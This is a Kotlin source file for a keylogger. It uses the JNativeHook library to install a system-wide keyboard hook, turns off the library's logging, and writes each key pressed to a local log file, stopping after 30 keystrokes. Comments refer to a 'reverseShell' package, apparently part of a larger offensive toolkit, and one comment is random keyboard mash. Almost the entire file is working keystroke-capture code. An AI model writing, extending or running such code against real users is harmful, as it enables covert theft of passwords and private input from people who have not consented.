package Classes.keyLogger

import com.github.kwhat.jnativehook.GlobalScreen
import com.github.kwhat.jnativehook.NativeHookException
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener
import java.io.BufferedWriter
import java.io.FileWriter
import java.util.LinkedList
import java.util.logging.Level
import java.util.logging.Logger

class KeyLogger(private val logFile: String) : NativeKeyListener {

    private val writer: BufferedWriter = BufferedWriter(FileWriter(logFile, true))
    private val keyBuffer: LinkedList<Char> = LinkedList()
    private var counter: Int = 0

    init {
        println("Keylogger started. Press any key...")
    }
        //asdfhuialshdfuisdahflausdihflasduihfsaldiufhsadlifsdaulifh
    override fun nativeKeyPressed(e: NativeKeyEvent) {
        val keyChar = NativeKeyEvent.getKeyText(e.keyCode).first()
        keyBuffer.add(keyChar)
        if (keyBuffer.size > 30) {
            val oldestKey = keyBuffer.removeFirst()
            writeKeyToFile(oldestKey)
        }
        writeKeyToFile(keyChar)

        counter++
        if (counter >= 30) {
            unregisterNativeHook()
            closeWriter()
            exitProgram()
        }
    }

    override fun nativeKeyReleased(e: NativeKeyEvent) {
        // Not used in this simplified version
    }

    override fun nativeKeyTyped(e: NativeKeyEvent) {
        // Not used in this simplified version
    }

    private fun writeKeyToFile(keyChar: Char) {
        writer.write(keyChar.toString())
        writer.newLine()
        writer.flush()
    }

    private fun unregisterNativeHook() {
        GlobalScreen.unregisterNativeHook()
    }

    private fun closeWriter() {
        writer.close()
    }

    private fun exitProgram() {
        System.exit(0)
    }

    companion object {
        @JvmStatic
        fun main(args: Array<String>) {
            val logFile = "keylog.txt"
            try {
                // Disable JNativeHook logging
                val logger = Logger.getLogger(GlobalScreen::class.java.`package`.name)
                logger.level = Level.OFF

                // Register the reverseShell.KeyLogger.KeyLogger
                GlobalScreen.registerNativeHook()

                // Add the reverseShell.KeyLogger.KeyLogger
                GlobalScreen.addNativeKeyListener(KeyLogger(logFile))
            } catch (ex: NativeHookException) {
                ex.printStackTrace()
            }
        }
    }
}